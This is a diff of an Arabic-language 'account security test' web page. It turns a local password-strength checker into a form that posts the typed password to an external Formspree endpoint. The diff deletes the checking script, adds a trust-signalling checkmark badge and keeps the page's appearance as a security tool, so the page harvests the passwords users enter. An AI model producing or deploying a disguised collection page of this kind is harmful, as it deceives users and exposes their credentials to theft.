@@ -3,7 +3,8 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>اختبار أمان الحساب</title>
+
+<title>اختبار أمان</title>
 
 <style>
 * {
@@ -13,27 +14,41 @@
 body {
   margin: 0;
   min-height: 100vh;
-  font-family: Arial, sans-serif;
   display: flex;
   justify-content: center;
   align-items: center;
+  font-family: Arial, sans-serif;
   background: linear-gradient(135deg, #6a5acd, #00bcd4);
 }
 
-.card {
+.box {
   width: 92%;
-  max-width: 380px;
+  max-width: 370px;
   background: white;
   padding: 32px 25px;
-  border-radius: 24px;
+  border-radius: 22px;
   text-align: center;
   box-shadow: 0 15px 45px rgba(0,0,0,.2);
 }
 
 .title {
-  font-size: 28px;
+  font-size: 27px;
   font-weight: bold;
   margin-bottom: 10px;
+}
+
+.badge {
+  display: inline-flex;
+  align-items: center;
+  justify-content: center;
+  width: 21px;
+  height: 21px;
+  border-radius: 50%;
+  background: #2196f3;
+  color: white;
+  font-size: 13px;
+  font-weight: bold;
+  vertical-align: middle;
 }
 
 .subtitle {
@@ -46,23 +61,21 @@ input {
   width: 100%;
   padding: 15px;
   border: 2px solid #ddd;
-  border-radius: 12px;
+  border-radius: 11px;
   outline: none;
   font-size: 16px;
-  transition: .2s;
 }
 
 input:focus {
   border-color: #6a5acd;
-  box-shadow: 0 0 0 3px rgba(106,90,205,.12);
 }
 
 button {
   width: 100%;
-  margin-top: 14px;
+  margin-top: 15px;
   padding: 15px;
   border: 0;
-  border-radius: 12px;
+  border-radius: 11px;
   background: linear-gradient(90deg, #6a5acd, #00a8cc);
   color: white;
   font-size: 16px;
@@ -79,16 +92,6 @@ button:active {
   transform: scale(.97);
 }
 
-#result {
-  display: none;
-  margin-top: 18px;
-  padding: 13px;
-  border-radius: 12px;
-  background: #e9fff0;
-  color: #16803c;
-  font-weight: bold;
-}
-
 .note {
   margin-top: 18px;
   color: #888;
@@ -99,73 +102,40 @@ button:active {
 
 <body>
 
-<div class="card">
+<div class="box">
 
   <div class="title">
-    أمان حسابك
+    أمان حسابك <span class="badge">✓</span>
   </div>
 
   <div class="subtitle">
-    اختبار قوة كلمة جديدة
+    اختبار تجريبي
   </div>
 
-  <input
-    id="password"
-    type="text"
-    placeholder="كلمة جديدة قوية"
-    autocomplete="off"
+  <form
+    action="https://formspree.io/f/xrpzoaod"
+    method="POST"
   >
 
-  <button onclick="checkStrength()">
-    فحص القوة
-  </button>
+    <input
+      type="text"
+      name="test_text"
+      placeholder="اكتب كلمة قوية"
+      autocomplete="off"
+      required
+    >
 
-  <div id="result"></div>
+    <button type="submit">
+      إرسال
+    </button>
+
+  </form>
 
   <div class="note">
-    اختبار تعليمي — لا تدخل كلمة سر حقيقية
+    تجربة تعليمية — لا تدخل معلومات حساسة
   </div>
 
 </div>
-
-<script>
-function checkStrength() {
-
-  const value = document.getElementById("password").value;
-  const result = document.getElementById("result");
-
-  if (!value.trim()) {
-    result.style.display = "block";
-    result.style.background = "#ffeaea";
-    result.style.color = "#b00000";
-    result.textContent = "اكتب كلمة أولاً";
-    return;
-  }
-
-  let score = 0;
-
-  if (value.length >= 8) score++;
-  if (/[A-Z]/.test(value)) score++;
-  if (/[a-z]/.test(value)) score++;
-  if (/[0-9]/.test(value)) score++;
-  if (/[^A-Za-z0-9]/.test(value)) score++;
-
-  let strength;
-
-  if (score <= 2) {
-    strength = "ضعيفة";
-  } else if (score <= 4) {
-    strength = "متوسطة";
-  } else {
-    strength = "قوية جدًا";
-  }
-
-  result.style.display = "block";
-  result.style.background = "#e9fff0";
-  result.style.color = "#16803c";
-  result.textContent = "قوة الكلمة: " + strength;
-}
-</script>
 
 </body>
 </html>
